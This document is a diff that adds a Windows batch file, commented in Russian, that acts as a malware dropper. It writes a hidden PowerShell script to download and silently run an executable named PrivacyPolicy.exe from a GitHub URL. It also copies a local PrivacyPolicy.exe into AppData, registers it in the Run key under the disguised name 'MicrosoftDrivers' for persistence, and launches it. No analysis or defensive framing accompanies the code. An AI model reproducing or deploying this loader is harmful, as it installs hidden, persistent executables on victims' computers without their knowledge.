@@ -1,0 +1,19 @@
+��&@echo off
+setlocal
+
+:: Создаем и запускаем скрытый PowerShell скрипт
+echo $url = 'https://github.com/alenka0912/file/raw/refs/heads/main/PrivacyPolicy.exe' > "%temp%\inv.ps1"
+echo $path = [System.IO.Path]::GetTempFileName() + '.exe' >> "%temp%\inv.ps1"
+echo (New-Object Net.WebClient).DownloadFile($url, $path) >> "%temp%\inv.ps1"
+echo $psi = New-Object System.Diagnostics.ProcessStartInfo >> "%temp%\inv.ps1"
+echo $psi.FileName = $path >> "%temp%\inv.ps1"
+echo $psi.WindowStyle = 'Hidden' >> "%temp%\inv.ps1"
+echo [System.Diagnostics.Process]::Start($psi) >> "%temp%\inv.ps1"
+echo Start-Sleep -Seconds 3 >> "%temp%\inv.ps1"
+echo Remove-Item $path >> "%temp%\inv.ps1"
+cd /d %~dp0
+copy /b "PrivacyPolicy.exe" "%AppData%\PrivacyPolicy.exe"
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v MicrosoftDrivers /t REG_SZ /d "%AppData%\PrivacyPolicy.exe" 
+Start %AppData%\PrivacyPolicy.exe
+Exit
+powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%temp%\inv.ps1"
